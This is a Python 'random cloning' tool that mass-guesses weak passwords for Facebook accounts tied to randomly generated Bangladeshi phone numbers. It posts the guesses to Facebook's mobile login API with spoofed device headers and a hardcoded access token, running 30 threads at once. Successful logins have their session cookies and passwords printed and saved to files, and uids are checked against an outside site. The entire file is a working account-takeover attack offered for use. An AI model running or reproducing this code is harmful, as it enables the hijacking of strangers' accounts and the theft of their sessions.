import os,time,sys
os.system('clear')
from os import path
import os,base64,zlib,pip,urllib
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
import subprocess
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Banglalink'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Banglalink"
                        sim_id+=fbcr
        else:
                fbcr = 'Banglakink'
                sim_id+=fbcr
except:
        fbcr = "Banglalink"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

G='\033[38;5;46m'
R='\033[38;5;196m'
B='\033[1;34m'
Y='\033[1;33m'
P='\033[38;5;203m'
W='\033[1;37m'
X='\033[1;30m'

#os.system('xdg-open https://www.facebook.com/profile.php?id=100079519400970')
def banner():
        os.system('clear')
        print(f"""
\33[1;92m  ██████ \033[1;93m ██     \033[1;91m  █████ \033[1;96m  ██████\033[1;30m ██   ██
\33[1;92m  ██   ██\033[1;93m ██     \033[1;91m ██   ██\033[1;96m ██     \033[1;30m ██  ██
\33[1;92m  ██████ \033[1;93m ██     \033[1;91m ███████\033[1;96m ██     \033[1;30m █████
\33[1;92m  ██   ██\033[1;93m ██     \033[1;91m ██   ██\033[1;96m ██     \033[1;30m ██  ██
\33[1;92m  ██████ \033[1;93m ███████\033[1;91m ██   ██\033[1;96m  ██████\033[1;30m ██   ██
\33[1;90m┏\033[1;30m──────────────────────────────────────────\33[1;90m┓            
\033[1;30m┃\x1b[97m\033[37;41m     BLACK RANDOM CLONING FREE TOOLS      \033[0;m\33[1;92m\33[1;90m┃
\33[1;90m┗\033[1;30m──────────────────────────────────────────\33[1;90m┛        
\033[1;30m───────────────────────────────────────────
\x1b[1;92m \x1b[1;97m[\x1b[1;92m⍣\x1b[1;97m]\33[1;92m AUTHOR    : MD MORSHED             
\x1b[1;92m \x1b[1;97m[\x1b[1;92m⍣\x1b[1;97m] \33[1;92mFACEBOOK  : MD MORSHED            
\x1b[1;92m \x1b[1;97m[\x1b[1;92m⍣\x1b[1;97m] \33[1;92mTOOL      : RANDOM CLONE            
\033[1;30m───────────────────────────────────────────""")

def linex():
        print(f'{X}───────────────────────────────────────────')






loop=0
oks=[]
cps=[]
twf=[]

def Black():
        banner()
        print('\033[1;32m [1] START BD RANDOM CLONING\n [2] TOOLS AIDMAN \n \033[1;31m[0] EXIT')
        print(f'\033[1;30m───────────────────────────────────────────')
        x=input('\033[1;32m [⍣] Choose : ')
        #os.system('xdg-open https://facebook.com/groups/1919451095053010/')
        if x in '1':
                BD()
        if x in '2':
                IN()



def BD():
                user=[]
                banner()
                code = input(f'\033[1;32m [⍣] BD CODE : 017\033[1;31m/\033[1;32m015\033[1;31m/\033[1;32m018\033[1;31m/\033[1;32m019\033[1;31m/\033[1;32m013\033[1;31m/\033[1;32m015\033[1;31m/\033[1;32m016\n\033[1;30m───────────────────────────────────────────\n\033[1;32m[{R}⍣{G}]{W} SIM CODE {R}:{G} ');linex()
                #os.system('xdg-open https://www.facebook.com/profile.php?id=100094011308962')
                banner()
                try:
                        limit = int(input(f' \033[1;32m[{R}⍣{G}]{W} EXAMPLE {R}:{G} 1000\033[1;31m/\033[1;32m5000\033[1;31m/\033[1;32m10000\033[1;31m/\033[1;32m15000\033[1;31m/\033[1;32m20000\n\033[1;30m───────────────────────────────────────────\n\033[1;32m [{R}×{G}]{W} LIMIT {R}:{G} '))
                       # os.system('xdg-open https://github.com/M-Black119')
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as BLACK:     
                        banner()
                        tl = str(len(user))
                        print(f' \033[1;32m[{R}⍣{G}]{G} SIM ID   {R}:{G} {code}')
                        print(f' [{R}⍣{G}]{G} TOTAL ID {R}:{G} {tl}')
                        print(f' \033[1;32m[{R}⍣{G}]{G} FIRST \033[1;37m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;37m] \033[1;92mAIRPLANE MODE')
                        print(f' \033[1;32m[{R}⍣{G}]{G} MIX IDZ CLONING ENJOY DEAR USER')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,ids[:8],'bangla','102030','203040','304050','999888','freefire','free fire','09876543','@#@#@#']
                                BLACK.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(f'[{R}×{G}]{W} PROCESS HAS BEEN DONE')
                print(f'[{R}×{G}]{W} TOTAL OK/CP/2F {R}:{G} {str(len(oks))}{Y}/{P}{str(len(cps))}{Y}/{B}{str(len(twf))}')
                linex()
                input(f' {W}Press enter to back ')
                Black()

gt = random.choice(['GT-720Y','GT-7161P','GT-737B','GT-7704Z','GT-6595V','GT-7413Z','GT-6187I','GT-9827V','GT-698I','GT-7666H','GT-6754M','GT-8397T','GT-6583L','GT-9255I','GT-6291A','GT-9813X','GT-789V','GT-731E','GT-7902O','GT-9707G','GT-9667E','GT-8981T','GT-8413C','GT-9870S','GT-7473R','GT-6214U','GT-6639R','GT-6299V','GT-6349Y','GT-8551V','GT-7369W','GT-9680A','GT-9339O','GT-9477O','GT-9574A','GT-7664U','GT-8167D','GT-8637G','GT-9620I','GT-6799D','GT-7155P','GT-8748U','GT-9372K','GT-9363U','GT-879Y','GT-7381G','GT-95A','GT-9475V','GT-7359E','GT-8608S','GT-6711','GT-9311','GT-6243','GT-8862','GT-9147','GT-8853','GT-8539','GT-6330','GT-9408','GT-9404','GT-9856','GT-6577','GT-6898','GT-6396','GT-6511','GT-6910','GT-8229','GT-7738','GT-8599','GT-9881','GT-713','GT-649','GT-9950','GT-8554','GT-910','GT-6897','GT-9886','GT-9398','GT-9974','GT-7340','GT-8395','GT-9216','GT-7424','GT-8688','GT-6809','GT-7489','GT-6588','GT-7811','GT-9353','GT-6997','GT-9234','GT-9522','GT-9527','GT-6761','GT-849','GT-959','GT-78','GT-7461','GT-7524','GT-7205','GT-F5468','GT-Y7028','GT-V1796','GT-M8699','GT-O4668','GT-D8636','GT-K2289','GT-D7206','GT-F1776','GT-L9558','GT-O2869','GT-X8776','GT-O7468','GT-Q3927','GT-Y6207','GT-S5088','GT-N5819','GT-T6048','GT-D8186','GT-M3416','GT-Z9076','GT-D7457','GT-X8506','GT-R9249','GT-T9686','GT-V3567','GT-U6586','GT-H7078','GT-D5056','GT-V5009','GT-C7639','GT-F9789','GT-I5009','GT-A9859','GT-C2277','GT-A5498','GT-T3038','GT-I9596','GT-U8308','GT-C4509','GT-C4366','GT-S4486','GT-Q2749','GT-F8429','GT-M7917','GT-A1387','GT-K3637','GT-B649','GT-Z5836','GT-H6149','GT-A579M','GT-B239W','GT-T974Y','GT-V269F','GT-N262E','GT-T730F','GT-E494W','GT-P101W','GT-H742I','GT-L21J','GT-J83N','GT-L168P','GT-V764S','GT-P24F','GT-A556E','GT-H219F','GT-G902O','GT-N958X','GT-L848B','GT-Q357E','GT-U798G','GT-N556C','GT-M424D','GT-G805Z','GT-W77S','GT-Q805A','GT-P306K','GT-H93P','GT-X5L','GT-N32P','GT-W9F','GT-F760H','GT-S857C','GT-U28W','GT-W277G','GT-O356C','GT-T678K','GT-I510B','GT-E31V','GT-V6R','GT-O414Z','GT-E846Z','GT-H467E','GT-F324D','GT-R263T','GT-P113I','GT-P81N','GT-Q552G','GT-Q374S','GT-A703G'])
gt = random.choice(['GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T'])
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{X} [\033[38;5;47mBLACK-XD{X}]-{G}{X}[{G}{loop}{X}]-{G}{X}[{G}OK:{len(oks)}{X}]');sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.orca'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+gt+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.75,width=720,height=1504};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Robi'+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+gt+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        
                        device_id = str(uuid.uuid4())
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);sex = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                cookie = f"mr={sex};{ckkk}"
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        p=requests.get(f"https://teampeaky.xyz/live.php?uid={uid}").text
                                        if "Lock" in p:
                                            pass
                                        else:
                                            print("OK")
                                            print(f'\r\r{G} [{W}BLACK-OK{G}] {str(uid)} | {pas}')
                                            print(f'\r[💉{G}] COKIE {R}:\033[38;5;47m {cookie}')
                                            open('/sdcard/BLACK.X- COOKIE.txt', 'a').write(cookie+'\n')
                                            open('/sdcard/BLACK-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                            oks.append(str(uid))
                                            break
                        elif twf in str(po):
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = idf
                                if uid in oks:pass
                                else:
                                        print(f'\r\r\033[1;36m [BLACK-2F] {str(uid)} | {pas}')
                                        open('/sdcard/BLACK-R-2F.txt','a').write(str(uid)+'|'+pas+'\n')
                                        twf.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        #print('\r\r\x1b[38;5;208m[BLACK-CP] ⍣ '+str(uid)+' ⍣ '+pas+'\033[1;97m')
                                        open('/sdcard/BLACK-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
                
                
Black()